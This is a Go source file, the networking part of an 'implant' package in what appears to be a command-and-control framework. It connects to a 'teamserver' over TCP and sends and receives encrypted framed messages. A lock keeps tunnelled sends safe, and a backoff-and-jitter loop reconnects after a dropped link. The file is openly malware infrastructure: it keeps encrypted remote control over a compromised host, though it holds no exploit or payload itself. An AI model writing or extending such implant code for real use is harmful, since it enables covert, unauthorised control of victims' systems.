package implant

import (
	"fmt"
	"math"
	"net"
	"sync"
	"time"

	"c2/pkg/protocol"
)

var writeMu sync.Mutex

// Connect establishes a TCP connection to the teamserver.
func Connect(host string, port string) (net.Conn, error) {
	addr := fmt.Sprintf("%s:%s", host, port)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connecting to %s: %w", addr, err)
	}
	return conn, nil
}

// SendFrame encrypts and sends a message over the connection.
func SendFrame(conn net.Conn, msgType uint32, body interface{}, key []byte) error {
	plaintext, err := protocol.Serialize(body)
	if err != nil {
		return fmt.Errorf("serializing: %w", err)
	}

	encrypted, err := Encrypt(key, plaintext)
	if err != nil {
		return fmt.Errorf("encrypting: %w", err)
	}

	envelope := protocol.EncodeEnvelope(msgType, encrypted)

	if _, err := conn.Write(envelope); err != nil {
		return fmt.Errorf("writing: %w", err)
	}

	return nil
}

// RecvFrame reads, decrypts, and returns a message from the connection.
// Returns the message type and the raw decrypted plaintext payload.
func RecvFrame(conn net.Conn, key []byte) (uint32, []byte, error) {
	msgType, encryptedPayload, err := protocol.ReadFullEnvelope(conn)
	if err != nil {
		return 0, nil, fmt.Errorf("reading envelope: %w", err)
	}

	plaintext, err := Decrypt(key, encryptedPayload)
	if err != nil {
		return 0, nil, fmt.Errorf("decrypting: %w", err)
	}

	return msgType, plaintext, nil
}

// SendFrameSafe is the thread-safe version of SendFrame for use from tunnel goroutines.
func SendFrameSafe(conn net.Conn, msgType uint32, body interface{}, key []byte) error {
	writeMu.Lock()
	defer writeMu.Unlock()
	return SendFrame(conn, msgType, body, key)
}

// ReconnectLoop attempts to reconnect with exponential backoff.
// Returns a connected net.Conn or the context deadline error.
func ReconnectLoop(host, port string, maxWait time.Duration) (net.Conn, error) {
	attempt := 0

	for {
		conn, err := Connect(host, port)
		if err == nil {
			return conn, nil
		}

		attempt++
		delay := time.Duration(math.Min(
			float64(maxWait),
			float64(time.Second)*math.Pow(2, float64(attempt-1)),
		))

		// Add jitter
		jitter := time.Duration(float64(delay) * 0.2)
		delay = delay - jitter/2 + time.Duration(float64(jitter)*float64(time.Now().UnixNano()%1000)/1000)

		if delay > maxWait {
			delay = maxWait
		}

		time.Sleep(delay)
	}
}
